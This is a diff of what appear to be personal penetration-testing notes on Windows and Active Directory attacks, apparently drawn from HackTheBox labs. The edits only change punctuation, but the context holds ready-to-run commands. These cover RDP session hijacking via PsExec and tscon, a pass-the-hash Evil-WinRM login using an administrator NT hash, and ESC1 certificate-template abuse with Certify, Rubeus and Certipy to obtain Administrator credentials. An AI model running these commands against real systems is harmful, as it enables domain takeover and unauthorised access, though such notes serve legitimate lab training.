@@ -16,14 +16,14 @@ To run the command, we can start the sessionhijack service:
 C:\htb> net start sessionhijack
 ```
 Note: This method no longer works on Server 2019.
-On Server 2019+, the sc.exe service trick above stops working because tscon no longer treats a service's SYSTEM context as good enough — it wants an actual interactive SYSTEM session behind the call. The fix is to get an interactive SYSTEM shell first, then hijack the session directly from it instead of spawning tscon via a service:
+On Server 2019+, the sc.exe service trick above stops working because tscon no longer treats a service's SYSTEM context as good enough. It wants an actual interactive SYSTEM session behind the call. The fix is to get an interactive SYSTEM shell first, then hijack the session directly from it instead of spawning tscon via a service:
 ```
 PsExec64.exe -s -i cmd.exe
 ```
 ```
 C:\Windows\system32> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
 ```
-Any other way of getting an interactive SYSTEM token first (a Potato-family token impersonation trick, etc.) works the same way — the requirement is just that tscon runs from that SYSTEM shell directly.
+Any other way of getting an interactive SYSTEM token first (a Potato-family token impersonation trick, etc.) works the same way: the requirement is just that tscon runs from that SYSTEM shell directly.
 ## Pass the Hash (PtH)
 ### Included in Windows Lateral Movement
 ```
@@ -117,7 +117,7 @@ With the hash, I can get a shell as administrator using Evil-WinRM:
 oxdf@hacky$ evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
 ```
 ### ESC1
-ESC1 is when a certificate template lets the requester supply their own Subject Alternative Name (SAN) — so any low-privileged user can request a cert as anyone, including Administrator, as long as the template also has the client-auth EKU and doesn't require manager approval.
+ESC1 is when a certificate template lets the requester supply their own Subject Alternative Name (SAN), so any low-privileged user can request a cert as anyone, including Administrator, as long as the template also has the client-auth EKU and doesn't require manager approval.
 Windows, with Certify:
 ```
 Certify.exe find /vulnerable
@@ -129,14 +129,14 @@ Feed the returned cert into Rubeus to get a TGT straight off it:
 ```
 Rubeus.exe asktgt /user:administrator /certificate:<base64-cert> /password:<cert-password> /ptt
 ```
-Linux, with Certipy — one command handles the request, another does the PKINIT auth:
+Linux, with Certipy: one command handles the request, another does the PKINIT auth:
 ```
 certipy req -u lowpriv@domain.local -p 'Password123' -ca <CA-NAME> -target <CA-HOST> -template <VULNERABLE-TEMPLATE> -upn administrator@domain.local
 ```
 ```
 certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
 ```
-Same payoff as the ESC7 path above — an NT hash for Administrator, usable straight into Evil-WinRM.
+Same payoff as the ESC7 path above: an NT hash for Administrator, usable straight into Evil-WinRM.
 # Domain Controllers, Windows 7 and 10
 ## CVE-2021-1675/CVE-2021-34527 PrintNightmar
 ```
